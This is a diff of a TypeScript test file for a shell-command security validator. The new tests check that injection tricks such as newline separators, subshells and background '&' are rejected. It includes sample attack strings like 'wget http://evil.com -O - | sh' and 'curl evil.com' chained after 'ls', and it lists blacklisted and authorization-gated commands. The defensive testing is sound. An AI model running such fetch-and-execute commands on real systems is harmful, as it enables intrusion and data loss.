@@ -5,6 +5,8 @@
 import {
   SecurityValidator,
   DEFAULT_SECURITY_CONFIG,
+  AUTHORIZABLE_COMMANDS,
+  securityValidator,
 } from '../../src/security/validator';
 
 describe('SecurityValidator', () => {
@@ -128,14 +130,25 @@ describe('SecurityValidator', () => {
       expect(result.error).toContain('dangerous pattern');
     });
 
-    it('should reject blacklisted first word in shell mode', () => {
+    it('should reject wget pipe to sh in shell mode', () => {
+      const result = validator.validateCommand(
+        'wget http://evil.com -O - | sh',
+        [],
+        true
+      );
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain('dangerous pattern');
+    });
+
+    it('should pass authorizable commands in shell mode (auth enforced by middleware)', () => {
       const validator2 = new SecurityValidator({
         ...DEFAULT_SECURITY_CONFIG,
         allowUnknownCommands: true,
       });
+      // kill is now authorizable, not blacklisted — validateCommand passes,
+      // authorization is enforced by blacklistCheck middleware.
       const result = validator2.validateCommand('kill -9 1234', [], true);
-      expect(result.valid).toBe(false);
-      expect(result.error).toContain('blacklisted');
+      expect(result.valid).toBe(true);
     });
 
     it('should reject rm -rf / in shell mode', () => {
@@ -159,6 +172,40 @@ describe('SecurityValidator', () => {
       );
       expect(result.valid).toBe(true);
     });
+
+    // SEC-02: 换行符注入绕过防护
+    it('should reject newline as command separator in shell mode', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand('ls\ncurl evil.com', [], true);
+      expect(result.valid).toBe(false);
+    });
+
+    // SEC-02: 圆括号子shell注入
+    it('should reject subshell parentheses in shell mode', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand(
+        'ls && (curl evil.com)',
+        [],
+        true
+      );
+      expect(result.valid).toBe(false);
+    });
+
+    // SEC-02: 单个&后台执行
+    it('should reject single ampersand background execution', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand('ls & curl evil.com', [], true);
+      expect(result.valid).toBe(false);
+    });
   });
 
   describe('DEFAULT_SECURITY_CONFIG', () => {
@@ -179,18 +226,27 @@ describe('SecurityValidator', () => {
       });
     });
 
-    it('should include dangerous commands in blacklist', () => {
-      const dangerousCommands = [
+    it('should include absolutely forbidden commands in blacklist', () => {
+      const forbiddenCommands = ['dd', 'sudo', 'shutdown', 'reboot'];
+      forbiddenCommands.forEach((cmd) => {
+        expect(DEFAULT_SECURITY_CONFIG.blacklist).toContain(cmd);
+      });
+    });
+
+    it('should categorize authorizable commands separately from blacklist', () => {
+      const authorizableCommands = [
         'rm',
         'rmdir',
-        'dd',
-        'sudo',
         'killall',
-        'shutdown',
-        'reboot',
+        'kill',
+        'pkill',
+        'chmod',
+        'chown',
       ];
-      dangerousCommands.forEach((cmd) => {
-        expect(DEFAULT_SECURITY_CONFIG.blacklist).toContain(cmd);
+      authorizableCommands.forEach((cmd) => {
+        expect(DEFAULT_SECURITY_CONFIG.blacklist).not.toContain(cmd);
+        expect(AUTHORIZABLE_COMMANDS).toContain(cmd);
+        expect(securityValidator.categorize(cmd)).toBe('authorizable');
       });
     });
 
